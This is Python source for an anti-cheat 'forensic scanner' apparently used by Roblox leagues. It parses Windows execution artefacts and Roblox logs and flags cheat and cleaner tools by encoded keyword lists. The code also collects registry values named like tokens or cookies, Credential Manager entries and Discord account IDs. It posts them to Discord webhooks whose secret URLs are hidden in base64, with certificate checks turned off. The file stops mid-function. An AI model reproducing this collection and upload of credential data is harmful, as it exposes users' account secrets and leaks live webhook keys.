"""
Comet Scanner v4 — Forensic Scanner
Rebranded from Lite to Comet
Build: pyinstaller --onefile --noconsole --name=CometScanner comet_scanner.py
"""
# ============================================================
#  CONFIG
# ============================================================
import base64 as _b64
def _d(s): return _b64.b64decode(s).decode()

# Keywords — encoded to prevent trivial bypass by name
_KW_ENC = [
    "dm9sdA==","bWF0Y2hh","Y2x1bXN5","c29sYXJh","eGVubw==",
    "cG90YXNzaXVt","Y3J5cHRpYw==","dmVsb2NpdHk=","c2lyaHVydA==",
    "dm9sY2Fubw==","YnVubmkuZnVu","c2VsaXdhcmU=","bWF0cml4",
    "ZXhlY3V0b3I=","cm9ibG94aGFjaw==","cmJseFg=",
    "d2F2ZWV4cGxvaXQ=","ZWxlY3Rlcg==","c3lub2FwZQ==",
    "c2NyaXB0d2FyZQ==","ZmluYWxlZA==","YXdha2VuZWQ=",
    "aW5qZWN0b3I=","Y2hlYXRlbmdpbmU=","YXJ0aWZpY2lhbGFpbQ==",
    "c3luYXBzZXg=","a3JuczQ=","ZXhlY3V0b3J4","c2t5aHVieA==",
]
KEYWORDS = [_d(k) for k in _KW_ENC]

# Known cheat file HASHES (SHA1) — rename won't help
KNOWN_CHEAT_HASHES = set()  # Add SHA1s here as you collect them

_WH_FFL_ENC = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NTM1NTkyNjY1ODU1MTgwOS9Ua09kVEk2QldWQW0tUzBZbEpLTE5TQm9WQkZZRHZMYmlidVlhZWlPYmxIZ2tWZDB6aHJRdHBMUWdpV3VmWjRPVkYwRA=="
_WH_UFF_ENC = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NTM1NjE3NjE1MjY1ODA0MS85WnlCamgtX1hjZmN3TllXLVBWam9tNC1lVDhFWWRIdHVRQm10NnpxQVN4cDBsREFJY1FJYklMdDhmam9laENmNE9WXw=="
WEBHOOK_FFL = _d(_WH_FFL_ENC)
WEBHOOK_UFF = _d(_WH_UFF_ENC)

def get_webhook_for_league(league):
    return WEBHOOK_FFL if str(league).upper() == "FFL" else WEBHOOK_UFF

WEBSITE_URL = "https://pccheckersitee-production.up.railway.app"

FALSE_POSITIVE_PATHS = [
    "microsoft","windows","edge","chrome","firefox","mozilla",
    "program files","programdata","windowsapps","system32","syswow64",
    "onedrive","office","teams","skype","nvidia","amd","realtek",
    "intel","logitech","razer","corsair","steam\\steamapps\\common",
    "epicgames","origin","ubisoft",
    "appdata\\local\\microsoft","appdata\\roaming\\microsoft",
    "appdata\\local\\google",
]

LEGIT_APP_ALLOWLIST = {
    "volt":     ["node_modules","volt-0.","volt-1.","volt-2.","\\volt\\resources"],
    "velocity": ["\\velocity\\","vscodium","code\\extensions"],
    "matrix":   ["element","matrix.org","\\matrix\\resources"],
    "cryptic":  ["champions online","star trek","neverwinter","crypticstudios"],
}

SUSPICIOUS_DIRS = {
    "downloads","desktop","appdata\\local\\temp",
    "appdata\\roaming","appdata\\local\\packages","programdata",
}

# Cleaner signatures — process names and file paths
CLEANER_SIGNATURES = {
    "processes": [
        "privazer","ccleaner","bleachbit","eraser","harddiskscrubber",
        "cleanmgr","auslogics","iobit","glary","wisecleaner","fileshredder",
        "totalcommander","diskwipe","dban","eraserl","moo0","ntfsclean",
    ],
    "registry_keys": [
        r"SOFTWARE\Piriform\CCleaner",
        r"SOFTWARE\PrivaZer",
        r"SOFTWARE\BleachBit",
        r"SOFTWARE\IObit\IObit Uninstaller",
        r"SOFTWARE\Auslogics\BoostSpeed",
    ],
    "file_patterns": [
        "ccleaner","privazer","bleachbit","eraser.exe","moo0",
        "wisecleaner","auslogics","iobit","glary utilities",
    ],
}

def matches_keyword(text):
    t = text.lower()
    if any(fp in t for fp in FALSE_POSITIVE_PATHS):
        return []
    hits = []
    for kw in KEYWORDS:
        if kw.lower() not in t:
            continue
        allowlist = LEGIT_APP_ALLOWLIST.get(kw.lower(), [])
        if allowlist and any(ap in t for ap in allowlist):
            continue
        hits.append(kw)
    return hits

# ============================================================
#  IMPORTS
# ============================================================
import os, sys, re, glob, struct, hashlib, datetime, threading, time
import urllib.request, urllib.error, json, http.client, ssl, tempfile, subprocess
import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog

WINDOWS = sys.platform == "win32"
if WINDOWS:
    import winreg
    import ctypes

def now_str(): return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
def current_user(): return os.environ.get("USERNAME") or os.environ.get("USER") or "Unknown"

def sha1_file(path):
    try:
        h = hashlib.sha1()
        with open(path,"rb") as f:
            for chunk in iter(lambda: f.read(65536), b""): h.update(chunk)
        return h.hexdigest()
    except Exception: return "N/A"

def filetime_to_dt(ft):
    try:
        return datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=ft//10)
    except Exception: return None

def rot13(s):
    r = ""
    for c in s:
        if 'a' <= c <= 'z': r += chr((ord(c)-ord('a')+13)%26+ord('a'))
        elif 'A' <= c <= 'Z': r += chr((ord(c)-ord('A')+13)%26+ord('A'))
        else: r += c
    return r

def section(title, lines):
    header = f"\n{'─'*60}\n  ◈  {title}\n{'─'*60}\n"
    return header + "\n".join(str(l) for l in lines) + "\n"

# ============================================================
#  NETWORK
# ============================================================
def _ssl_ctx():
    ctx = ssl._create_unverified_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    return ctx

def _post_json(payload, url_override=None):
    target = url_override or WEBHOOK_UFF
    try:
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(target, data=data,
              headers={"Content-Type":"application/json",
                       "User-Agent":"CometScanner/4.0"}, method="POST")
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=15) as r:
            body = r.read()
            try: body = json.loads(body)
            except Exception: body = {}
            return True, r.status, ""
    except urllib.error.HTTPError as e:
        try: err = e.read().decode()[:120]
        except Exception: err = str(e)
        return False, e.code, err
    except Exception as e:
        return False, 0, str(e)

def _chunk(text, max_len=1900):
    lines = text.split("\n"); chunks = []; cur = ""
    for l in lines:
        if len(cur)+len(l)+1 > max_len:
            if cur: chunks.append(cur.strip())
            cur = l + "\n"
        else: cur += l + "\n"
    if cur.strip(): chunks.append(cur.strip())
    return chunks or ["(empty)"]

def send_webhook(results):
    verdict = results.get("verdict","UNKNOWN")
    total   = results.get("total_hits",0)
    league  = results.get("league","UFF")
    color   = {"CHEATER":0xf87171,"SUSPICIOUS":0xfbbf24,"CLEAN":0x34d399}.get(verdict,0x6b7280)
    webhook = get_webhook_for_league(league)
    errors  = []
    try:
        accounts  = results.get("roblox_accounts",[])
        acc_str   = "\n".join(f"• {a}" for a in accounts) if accounts else "None"
        discord_accs = results.get("discord_accounts",[])
        disc_str  = "\n".join(f"• @{a.get('username','?')} (ID:{a.get('id','?')})"
                              for a in discord_accs[:5]) if discord_accs else "None"
        unsigned  = results.get("unsigned_hits",[])
        us_str    = "\n".join(f"• {os.path.basename(u['path'])}" for u in unsigned[:10]) if unsigned else "None"
        vpn_info  = results.get("vpn_info","Unknown")
        cleaner_info = results.get("cleaner_info","None detected")
        summary = {
            "title": f"Comet Scanner — {verdict}",
            "color": color,
            "timestamp": datetime.datetime.utcnow().isoformat()+"Z",
            "fields":[
                {"name":"Verdict",        "value":f"**{verdict}**",      "inline":True},
                {"name":"Total Hits",     "value":str(total),             "inline":True},
                {"name":"PC User",        "value":current_user(),         "inline":True},
                {"name":"League",         "value":league,                 "inline":True},
                {"name":"ShellBag",       "value":str(results.get("shellbag_hits",0)),  "inline":True},
                {"name":"BAM",            "value":str(results.get("bam_hits",0)),        "inline":True},
                {"name":"Prefetch",       "value":str(results.get("prefetch_hits",0)),   "inline":True},
                {"name":"AppCompat",      "value":str(results.get("appcompat_hits",0)),  "inline":True},
                {"name":"Cheat Files",    "value":str(results.get("cheat_hits",0)),       "inline":True},
                {"name":"YARA",           "value":str(results.get("yara_hits",0)),        "inline":True},
                {"name":"Unsigned",       "value":str(len(unsigned)),                     "inline":True},
                {"name":"Cleaner Found",  "value":cleaner_info[:100],                     "inline":True},
                {"name":"VPN/Network",    "value":vpn_info[:200],                         "inline":False},
                {"name":"Roblox Accounts","value":acc_str[:1024],                         "inline":False},
                {"name":"Discord Accounts","value":disc_str[:512],                        "inline":False},
                {"name":"Unsigned EXEs",  "value":us_str[:512],                           "inline":False},
            ],
            "footer":{"text":f"Comet v4 · {now_str()} · {league}"},
        }
        ok,_,err = _post_json({"embeds":[summary]}, url_override=webhook)
        if not ok: errors.append(f"Summary: {err}")
        time.sleep(0.8)
        tabs = [
            ("ShellBags",        results.get("shellbags","")),
            ("BAM",              results.get("bam","")),
            ("Prefetch",         results.get("prefetch","")),
            ("AppCompat",        results.get("appcompat","")),
            ("Roblox Logs",      results.get("roblox","")),
            ("Cheat Files",      results.get("cheat","")),
            ("YARA",             results.get("yara","")),
            ("Unsigned",         results.get("unsigned","")),
            ("Recycle Bin",      results.get("recycle","")),
            ("SysMain/Bypass",   results.get("sysmain","")),
            ("Cleaners",         results.get("cleaners","")),
            ("Discord Cache",    results.get("discord","")),
            ("Running Procs",    results.get("processes","")),
            ("Registry Extras",  results.get("registry_extra","")),
            ("Network/VPN",      results.get("network","")),
        ]
        for name, text in tabs:
            if not text or not text.strip(): continue
            for i, chunk in enumerate(_chunk(text.strip())):
                embed={"title":name if i==0 else f"{name} (cont.)","color":color,
                       "description":f"```\n{chunk}\n```"}
                ok,_,err = _post_json({"embeds":[embed]}, url_override=webhook)
                if not ok: errors.append(f"{name}: {err}")
                time.sleep(0.8)
    except Exception as e:
        errors.append(str(e))
    return (False,"\n".join(errors)) if errors else (True,"OK")

def send_website(results, pin):
    if not pin: return False, "No PIN"
    try:
        payload = {
            "pin": pin, "league": results.get("league","UFF"),
            "pc_user": current_user(),
            "verdict": results.get("verdict","UNKNOWN"),
            "total_hits": results.get("total_hits",0),
            "roblox_accounts": results.get("roblox_accounts",[]),
            "report": results.get("report",{}),
        }
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            f"{WEBSITE_URL}/api/submit",
            data=data,
            headers={"Content-Type":"application/json",
                     "User-Agent":"CometScanner/4.0"},
            method="POST")
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=20) as r:
            body = json.loads(r.read().decode())
            status = r.status
        if status == 200: return True, ""
        else: return False, f"HTTP {status}: {body.get('error', str(body)[:80])}"
    except Exception as e:
        return False, str(e)

# ============================================================
#  SCANNERS
# ============================================================

def scan_shellbags():
    hits = []
    if not WINDOWS: return section("ShellBag Detection",["Windows only"]),0,[]
    hive_keys = [
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\Shell\BagMRU"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\ShellNoRoam\BagMRU"),
    ]
    def walk(hive, key_path, prefix, results, depth=0):
        if depth > 8: return
        try: key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        except OSError: return
        try:
            i = 0
            while True:
                try:
                    name, data, _ = winreg.EnumValue(key, i)
                    if isinstance(data, bytes):
                        decoded = data.decode("utf-16-le", errors="ignore").rstrip("\x00")
                        if decoded and len(decoded) > 2:
                            full = (prefix + "\\" + decoded).strip("\\")
                            results.append(full)
                    i += 1
                except OSError: break
        except Exception: pass
        try:
            j = 0
            while True:
                try:
                    sub = winreg.EnumKey(key, j)
                    walk(hive, key_path+"\\"+sub, prefix, results, depth+1); j += 1
                except OSError: break
        except Exception: pass
        winreg.CloseKey(key)

    all_paths = []
    for hive, base in hive_keys:
        try: walk(hive, base, "", all_paths)
        except Exception: pass

    # Shellbag integrity check — look for gaps in MRU sequence
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"SOFTWARE\Microsoft\Windows\Shell\BagMRU",
                             0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        mru_vals = []
        i = 0
        while True:
            try:
                name,_,_ = winreg.EnumValue(key,i)
                if name.isdigit(): mru_vals.append(int(name))
                i+=1
            except OSError: break
        winreg.CloseKey(key)
        mru_vals.sort()
        gaps = [mru_vals[i] for i in range(1,len(mru_vals)) if mru_vals[i]-mru_vals[i-1]>1]
    except Exception:
        gaps = []

    for path in all_paths:
        kws = matches_keyword(path)
        if kws: hits.append((path, "N/A", kws))

    lines = [f"{'Path':<70}|Timestamp", "-"*90]
    for path, ts, kws in hits:
        lines.append(f"{path:<70}|{ts}  [{', '.join(kws)}]")
    if gaps:
        lines.append(f"\n⚠ SHELLBAG INTEGRITY: {len(gaps)} MRU sequence gap(s) detected — possible selective deletion")
        for g in gaps[:5]: lines.append(f"  Gap at index: {g}")
    lines.append(f"\nIntegrity: {'SUSPICIOUS' if hits or gaps else 'Normal'}")
    return section("ShellBag Detection", lines), len(hits) + len(gaps), hits


def scan_bam():
    hits = []; bypass_flags = []
    if not WINDOWS: return section("BAM Detection",["Windows only"]),0,[]

    # BAM bypass check — see if BAM state was recently cleared
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SYSTEM\CurrentControlSet\Services\bam",
                             0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        try:
            state,_ = winreg.QueryValueEx(key, "Start")
            if state == 4: bypass_flags.append("BAM SERVICE DISABLED — execution history suppressed")
        except Exception: pass
        winreg.CloseKey(key)
    except Exception: pass

    # Check if BAM UserSettings is suspiciously empty
    try:
        base = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                              r"SYSTEM\CurrentControlSet\Services\bam\State\UserSettings",
                              0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        idx = 0
        while True:
            try:
                sid = winreg.EnumKey(base, idx)
                sk = winreg.OpenKey(base, sid, 0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
                vi = 0
                entry_count = 0
                while True:
                    try:
                        name, data, _ = winreg.EnumValue(sk, vi)
                        if name.startswith("\\Device\\") and isinstance(data, bytes):
                            entry_count += 1
                            ts = None
                            if len(data) >= 8:
                                ft = struct.unpack_from("<Q", data, 0)[0]
                                ts = filetime_to_dt(ft)
                            kws = matches_keyword(name)
                            if kws: hits.append((name, ts, kws))
                        vi += 1
                    except OSError: break
                winreg.CloseKey(sk)
                if entry_count < 3:
                    bypass_flags.append(f"BAM SID {sid[:20]}... has only {entry_count} entries — possible wipe")
                idx += 1
            except OSError: break
        winreg.CloseKey(base)
    except Exception: pass

    lines = []
    if bypass_flags:
        lines.append("⚠ BAM BYPASS INDICATORS:")
        for f in bypass_flags: lines.append(f"  ✗ {f}")
        lines.append("")
    for path, ts, kws in hits:
        ts_str = ts.strftime("%Y-%m-%d %H:%M:%S.%f") if ts else "N/A"
        lines.append(f"{path}\n  LastRun:{ts_str}  [{', '.join(kws)}]")
    if not hits and not bypass_flags: lines.append("  ✓ No BAM hits")
    lines.append(f"\nIntegrity: {'SUSPICIOUS' if hits or bypass_flags else 'Normal'}")
    return section("BAM Detection", lines), len(hits)+len(bypass_flags), hits


def scan_prefetch():
    pf_dir = r"C:\Windows\Prefetch"; hits = []
    bypass_flags = []

    # Prefetch bypass check
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters",
                             0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        val,_ = winreg.QueryValueEx(key, "EnablePrefetcher")
        winreg.CloseKey(key)
        if val == 0:
            bypass_flags.append("EnablePrefetcher=0 — Prefetching DISABLED via registry")
    except Exception: pass

    def read_dir(path):
        try:
            with open(path,"rb") as f: data = f.read(4096)
            decoded = data.decode("utf-16-le", errors="ignore")
            found = re.findall(r"C:[/\\][^\x00]{3,80}", decoded)
            return found[-1].strip() if found else None
        except Exception: return None

    pf_count = 0
    try:
        for pf in glob.glob(os.path.join(pf_dir,"*.pf")):
            pf_count += 1
            name = os.path.basename(pf)
            kws = matches_keyword(name)
            if kws:
                try:
                    mtime = datetime.datetime.fromtimestamp(os.stat(pf).st_mtime)
                except Exception: mtime = None
                hits.append((name, pf, mtime, read_dir(pf), kws))
    except Exception: pass

    # Low prefetch count = possible manual wipe
    if pf_count < 5 and os.path.exists(pf_dir):
        bypass_flags.append(f"Only {pf_count} prefetch files — possible manual deletion")

    lines = []
    if bypass_flags:
        lines.append("⚠ PREFETCH BYPASS INDICATORS:")
        for f in bypass_flags: lines.append(f"  ✗ {f}")
        lines.append("")
    for name, path, mtime, src, kws in hits:
        mt = mtime.strftime("%Y-%m-%d %H:%M:%S") if mtime else "N/A"
        lines.append(f"{path}\n  Modified:{mt} | Dir:{src or 'N/A'}\n  [{', '.join(kws)}]")
    if not hits and not bypass_flags: lines.append("  ✓ No prefetch hits")
    lines.append(f"\nIntegrity: {'SUSPICIOUS' if hits or bypass_flags else 'Normal'}")
    return section("Prefetch Hits", lines), len(hits)+len(bypass_flags), hits


def scan_appcompat():
    if not WINDOWS: return section("AppCompat",["Windows only"]),0,[]
    ac_hits = []; ua_hits = []
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache",
                             0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        data,_ = winreg.QueryValueEx(key,"AppCompatCache"); winreg.CloseKey(key)
        offset = 128 if data[:4]==b'\x30\x00\x00\x00' else 0
        while offset < len(data)-12:
            try:
                if data[offset:offset+4] != b'10ts': offset+=4; continue
                data_len = struct.unpack_from("<I",data,offset+8)[0]
                path_len = struct.unpack_from("<H",data,offset+12)[0]
                path_off = offset+14
                if path_off+path_len > len(data): break
                path = data[path_off:path_off+path_len].decode("utf-16-le",errors="ignore")
                kws = matches_keyword(path)
                if kws: ac_hits.append((path,kws))
                offset += 14+path_len+data_len
            except Exception: offset+=4
    except Exception: pass
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
                             0, winreg.KEY_READ)
        idx = 0
        while True:
            try:
                sub = winreg.EnumKey(key, idx)
                try:
                    ck = winreg.OpenKey(key, sub+"\\Count", 0, winreg.KEY_READ)
                    vi = 0
                    while True:
                        try:
                            name,_,_ = winreg.EnumValue(ck,vi)
                            decoded = rot13(name)
                            kws = matches_keyword(decoded)
                            if kws: ua_hits.append((decoded,kws))
                            vi+=1
                        except OSError: break
                    winreg.CloseKey(ck)
                except Exception: pass
                idx+=1
            except OSError: break
        winreg.CloseKey(key)
    except Exception: pass

    # Registry extras for flagged files
    extra_reg = []
    all_flagged_paths = [p for p,_ in ac_hits]
    for path in all_flagged_paths[:10]:
        fname = os.path.basename(path).replace("\\","")
        # Check MuiCache for this executable
        try:
            mc = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"LOCAL SETTINGS\Software\Microsoft\Windows\Shell\MuiCache",
                                0, winreg.KEY_READ)
            vi = 0
            while True:
                try:
                    name,val,_ = winreg.EnumValue(mc,vi)
                    if fname.lower() in name.lower():
                        extra_reg.append(f"MuiCache: {name} = {val}")
                    vi+=1
                except OSError: break
            winreg.CloseKey(mc)
        except Exception: pass

    lines = []
    for path,kws in ac_hits: lines.append(f"  AppCompat: {path}  [{', '.join(kws)}]")
    for path,kws in ua_hits: lines.append(f"  UserAssist: {path}  [{', '.join(kws)}]")
    if extra_reg:
        lines.append("\n  Registry cross-references:")
        for r in extra_reg: lines.append(f"    ► {r}")
    if not lines: lines.append("  ✓ No matches")
    return section("AppCompat / UserAssist", lines), len(ac_hits)+len(ua_hits), ac_hits+ua_hits


def scan_roblox_logs():
    issues=[]; all_logs=[]; account_map={}
    possible_dirs=[
        os.path.expanduser(r"~\AppData\Local\Roblox\logs"),
        os.path.expanduser(r"~\AppData\Local\Packages\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\LocalState\logs"),
        r"C:\Program Files (x86)\Roblox\logs", r"C:\Program Files\Roblox\logs",
    ]
    log_dir = next((d for d in possible_dirs if os.path.exists(d)), None)

    PAT_JOIN_PAIR   = re.compile(r'"UserId"%3a(\d{6,15})%2c"UserName"%3a"([A-Za-z0-9_]{3,20})"')
    PAT_REPORT_UID  = re.compile(r'\buserid:(\d{6,15})')
    PAT_URL_UID     = re.compile(r'"UserId"%3a(\d{6,15})')
    PAT_URL_UNAME   = re.compile(r'"UserName"%3a"([A-Za-z0-9_]{3,20})"')
    PAT_PLAYER_GUI  = re.compile(r'Players\.([A-Za-z0-9_]{3,20})\.PlayerGui')
    PAT_LOG_TIME    = re.compile(r'(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})')
    PAT_BLOXSTRAP_U = re.compile(r'"userId":\s*(\d{6,15})')
    PAT_CRASH       = re.compile(r'(crash|exception|fatal error|unhandled exception)', re.I)
    PAT_INJECT      = re.compile(r'(inject|dll attach|openprocess|writeprocess|createremote)', re.I)

    USERNAME_NOISE = {
        "playerscripts","playermodules","loadingscreen","coregui","luaappscreengui",
        "robloxapp","robloxcrasher","robloxplayerbeta","notificationscriptscript",
        "experienceinvite","sharelinktabcontroller","controlscript",
        "experiencetipsdisplaycontroller","experiencetipsdisplay",
    }

    manual_delete_flag = False
    crash_inject_flag = False

    if not log_dir:
        # No log dir = possible manual deletion
        lines = ["⚠ Roblox log directory NOT FOUND"]
        # Check if Roblox is installed at all
        roblox_installed = any(os.path.exists(p) for p in [
            os.path.expanduser(r"~\AppData\Local\Roblox"),
            r"C:\Program Files (x86)\Roblox",
            r"C:\Program Files\Roblox",
        ])
        if roblox_installed:
            lines.append("⚠ Roblox IS installed but logs directory missing")
            lines.append("⚠ MANUAL LOG DELETION DETECTED")
            manual_delete_flag = True
        else:
            lines.append("  Roblox does not appear to be installed")
        return section("Roblox Log Analysis", lines), 2 if manual_delete_flag else 0, []

    try:
        log_files = sorted(glob.glob(os.path.join(log_dir,"*.log")) +
                           glob.glob(os.path.join(log_dir,"*.txt")),
                           key=lambda f: os.path.getmtime(f), reverse=True)
    except Exception: log_files = []

    # Check for missing recent logs (manual deletion detection)
    if len(log_files) < 2:
        issues.append(("logs","N/A","Very few log files — possible manual deletion"))
        manual_delete_flag = True

    for fpath in log_files[:30]:
        fname = os.path.basename(fpath)
        try: fstat = os.stat(fpath)
        except Exception: continue
        fmtime = datetime.datetime.fromtimestamp(fstat.st_mtime)
        all_logs.append(fpath)
        try:
            with open(fpath,"r",encoding="utf-8",errors="ignore") as f:
                content = f.read(400000)
        except Exception: continue

        # Crash-while-injecting detection
        if PAT_CRASH.search(content) and PAT_INJECT.search(content):
            crash_inject_flag = True
            issues.append((fname, fmtime, "CRASH + INJECTION KEYWORDS — possible crash-on-inject"))

        for m in PAT_JOIN_PAIR.finditer(content):
            uid,uname = m.group(1), m.group(2)
            if uname.lower() in USERNAME_NOISE: continue
            if uid not in account_map:
                account_map[uid] = {"username":uname,"timestamps":[],"placeids":[],"sources":set()}
            else:
                if not account_map[uid]["username"] or account_map[uid]["username"]=="Unknown":
                    account_map[uid]["username"] = uname
            account_map[uid]["sources"].add("log_join")
            for t in PAT_LOG_TIME.findall(content)[:5]:
                account_map[uid]["timestamps"].append(t)

        for m in PAT_BLOXSTRAP_U.finditer(content):
            uid = m.group(1)
            if uid not in account_map:
                account_map[uid] = {"username":"Unknown","timestamps":[],"placeids":[],"sources":set()}
            account_map[uid]["sources"].add("bloxstrap")

        for m in PAT_PLAYER_GUI.finditer(content):
            uname = m.group(1)
            if uname.lower() in USERNAME_NOISE: continue
            ukey = f"__u_{uname.lower()}"
            if ukey not in account_map:
                account_map[ukey] = {"username":uname,"timestamps":[],"placeids":[],"sources":set()}
            account_map[ukey]["sources"].add("playergui")

    result_accounts = []
    seen = set()
    for uid, data in account_map.items():
        uname = data["username"] or "Unknown"
        clean_uid = uid if not uid.startswith("__") else None
        key = (uname.lower(), clean_uid)
        if key in seen: continue
        seen.add(key)
        ts_list = sorted(set(str(t) for t in data["timestamps"] if t), reverse=True)
        result_accounts.append({
            "username":uname,"userid":clean_uid,
            "placeids":sorted(data["placeids"]),
            "last_seen":ts_list[0] if ts_list else "Unknown",
            "sources":sorted(data["sources"]),
        })
    result_accounts.sort(key=lambda a:(0 if(a["userid"] and a["username"]!="Unknown") else 1 if a["userid"] else 2))

    named = [a for a in result_accounts if a["username"]!="Unknown"]
    multi = len(named) > 1

    lines = [f"\nLog Dir: {log_dir}", f"Total Logs: {len(all_logs)}", f"Accounts: {len(result_accounts)}", ""]
    if manual_delete_flag: lines.append("⚠ MANUAL LOG DELETION DETECTED\n")
    if crash_inject_flag: lines.append("⚠ CRASH-WHILE-INJECTING PATTERN DETECTED\n")
    if multi: lines.append(f"⚠ MULTIPLE ACCOUNTS ({len(named)}) — Possible ban evasion\n")
    if issues:
        lines.append("⚠ INTEGRITY ISSUES:")
        for fname,ts,reason in issues:
            lines.append(f"  {fname} | {ts.strftime('%m/%d/%Y %H:%M') if hasattr(ts,'strftime') else ts} | {reason}")
        lines.append("")
    lines.append("━"*50)
    for acc in result_accounts:
        lines.append(f"\n  Username : {acc['username']}")
        lines.append(f"  UserID   : {acc['userid'] or 'Unknown'}")
        lines.append(f"  Last Seen: {acc['last_seen']}")
        lines.append(f"  Places   : {', '.join(acc['placeids']) or 'N/A'}")
        lines.append(f"  Sources  : {', '.join(acc['sources'])}")
        lines.append("  " + "─"*35)
    if not result_accounts: lines.append("  No accounts found.")

    flat = []
    for acc in result_accounts:
        u=acc["username"]; i=acc["userid"] or ""
        if u!="Unknown" and i: flat.append(f"{u} (ID: {i})")
        elif u!="Unknown": flat.append(u)
        elif i: flat.append(f"UserID: {i}")

    tamper_count = len(issues)+(1 if multi else 0)+(2 if manual_delete_flag else 0)+(2 if crash_inject_flag else 0)
    return section("Roblox Log Analysis", lines), tamper_count, flat


def scan_roblox_alts_registry():
    """Extra alt detection via registry — survives log deletion."""
    if not WINDOWS: return section("Alt Detection (Registry)",["Windows only"]),0,[]
    accounts = []; hits = 0
    # Roblox stores last account info in registry
    reg_paths = [
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\RobloxStudio"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\ROBLOX Corporation\Versions"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Roblox"),
    ]
    for hive, path in reg_paths:
        try:
            key = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
            i = 0
            while True:
                try:
                    name, val, _ = winreg.EnumValue(key, i)
                    name_l = name.lower()
                    if any(x in name_l for x in ["userid","username","accountname","user_id","token","cookie"]):
                        accounts.append(f"{path}\\{name} = {str(val)[:80]}")
                        hits += 1
                    i+=1
                except OSError: break
            winreg.CloseKey(key)
        except Exception: pass

    # Also check Windows Credential Manager for Roblox entries
    cred_accounts = []
    try:
        import ctypes.wintypes
        out = subprocess.run(
            ["powershell","-NoProfile","-NonInteractive","-Command",
             "cmdkey /list | Select-String -Pattern 'roblox|rbx' -CaseSensitive:$false"],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        if out.stdout.strip():
            for line in out.stdout.strip().splitlines():
                if line.strip(): cred_accounts.append(line.strip())
    except Exception: pass

    # Browser cookies/localStorage for Roblox (path presence only, no content)
    browser_paths = [
        os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Cookies"),
        os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles"),
        os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"),
    ]
    browser_found = [p for p in browser_paths if os.path.exists(p)]

    lines = [f"\n  Registry account entries: {len(accounts)}"]
    for a in accounts: lines.append(f"  ► {a}")
    if cred_accounts:
        lines.append(f"\n  Credential Manager Roblox entries: {len(cred_accounts)}")
        for c in cred_accounts: lines.append(f"  ► {c}")
    if len(cred_accounts) > 1:
        lines.append("  ⚠ Multiple Roblox credentials stored — possible alt accounts")
        hits += len(cred_accounts)
    lines.append(f"\n  Browser profiles present: {len(browser_found)}/{len(browser_paths)}")

    return section("Alt Detection (Registry/Credentials)", lines), hits, accounts


def scan_cheat_files():
    """Cheat file scan with hash-based detection (rename bypass prevention)."""
    scan_dirs = [
        os.path.expanduser("~\\Downloads"), os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\AppData\\Local"), os.path.expanduser("~\\AppData\\Roaming"),
        "C:\\",
    ]
    SKIP = {"windows","system32","syswow64","programdata","program files","program files (x86)",
            "$recycle.bin","windowsapps","winsxs","servicing"}
    hits = []; hash_hits = []; scanned = 0

    for base in scan_dirs:
        if not os.path.exists(base): continue
        try:
            for root, dirs, files in os.walk(base):
                depth = root.replace(base,"").count(os.sep)
                if depth > 3: dirs.clear(); continue
                dirs[:] = [d for d in dirs if d.lower() not in SKIP]
                for fname in files:
                    scanned += 1
                    fpath = os.path.join(root, fname)
                    kws = matches_keyword(fpath)

                    # Hash-based detection (catches renamed cheats)
                    if fname.lower().endswith((".exe",".dll")):
                        try:
                            sz = os.path.getsize(fpath)
                            if sz < 50_000_000:
                                fhash = sha1_file(fpath)
                                if fhash in KNOWN_CHEAT_HASHES:
                                    hash_hits.append({"path":fpath,"sha1":fhash,
                                                      "reason":"KNOWN CHEAT HASH — renamed file detected"})
                        except Exception: pass

                    # PE header heuristics for renamed cheats (even without keyword match)
                    if not kws and fname.lower().endswith((".exe",".dll")):
                        try:
                            with open(fpath,"rb") as f: hdr = f.read(512)
                            if hdr.startswith(b"MZ"):
                                suspicious = []
